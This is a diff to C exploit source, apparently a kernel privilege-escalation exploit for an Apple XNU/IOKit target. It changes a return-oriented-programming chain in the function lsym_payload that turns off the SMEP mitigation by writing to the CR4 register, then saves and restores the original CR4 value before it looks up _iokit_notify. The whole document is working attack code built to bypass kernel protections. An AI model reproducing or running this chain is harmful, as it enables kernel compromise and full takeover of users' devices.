@@ -61,15 +61,17 @@ char lsym_payload(uint64_t *reg1, uint64_t *reg2, uint16_t regs, void* payload) 
         PUSH_GADGET(stack) = JUNK_VALUE; // pop r14
         PUSH_GADGET(stack) = JUNK_VALUE; // pop rbp
         
-        
         /*
+         
+         Save CR4
          
          Disable SMEP
          
          */
         
+        
         PUSH_GADGET(stack) = ROP_POP_RCX(mapping_kernel);
-        PUSH_GADGET(stack) = (uint64_t) scratch;
+        PUSH_GADGET(stack) = (uint64_t) &cr4_save;
         PUSH_GADGET(stack) = ROP_CR4_TO_RAX_WRITE_RAX_TO_pRCX_POP_RBP(mapping_kernel);
         PUSH_GADGET(stack) = JUNK_VALUE;
         PUSH_GADGET(stack) = ROP_POP_RCX(mapping_kernel);
@@ -78,6 +80,7 @@ char lsym_payload(uint64_t *reg1, uint64_t *reg2, uint16_t regs, void* payload) 
         PUSH_GADGET(stack) = JUNK_VALUE;
         PUSH_GADGET(stack) = ROP_POP_RDI(mapping_kernel);
         PUSH_GADGET(stack) = (uint64_t) scratch;
+        
         
         PUSH_GADGET(stack) = ROP_RAX_TO_CR4_WRITE_ESI_TO_60H_RDI_POP_RBP(mapping_kernel);
         PUSH_GADGET(stack) = JUNK_VALUE;
@@ -94,22 +97,20 @@ char lsym_payload(uint64_t *reg1, uint64_t *reg2, uint16_t regs, void* payload) 
         
         /*
          
-         Enable SMEP
+         Reset CR4
          
          */
         
-        PUSH_GADGET(stack) = ROP_POP_RCX(mapping_kernel);
-        PUSH_GADGET(stack) = (uint64_t) scratch;
-        PUSH_GADGET(stack) = ROP_CR4_TO_RAX_WRITE_RAX_TO_pRCX_POP_RBP(mapping_kernel);
-        PUSH_GADGET(stack) = JUNK_VALUE;
-        PUSH_GADGET(stack) = ROP_POP_RCX(mapping_kernel);
-        PUSH_GADGET(stack) = (uint64_t) 0x00100000;
-        PUSH_GADGET(stack) = ROP_OR_RCX_RAX_POP_RBP(mapping_kernel);
+        PUSH_GADGET(stack) = ROP_POP_RAX(mapping_kernel);
+        PUSH_GADGET(stack) = (uint64_t) &cr4_save;
+        PUSH_GADGET(stack) = ROP_READ_RAX_TO_RAX_POP_RBP(mapping_kernel);
         PUSH_GADGET(stack) = JUNK_VALUE;
         PUSH_GADGET(stack) = ROP_POP_RDI(mapping_kernel);
         PUSH_GADGET(stack) = (uint64_t) scratch;
         PUSH_GADGET(stack) = ROP_RAX_TO_CR4_WRITE_ESI_TO_60H_RDI_POP_RBP(mapping_kernel);
         PUSH_GADGET(stack) = JUNK_VALUE;
+        
+
         
         // locks are unlocked in this function
         uint64_t iokit_nf = lsym_find_symbol(mapping_kernel, "_iokit_notify");
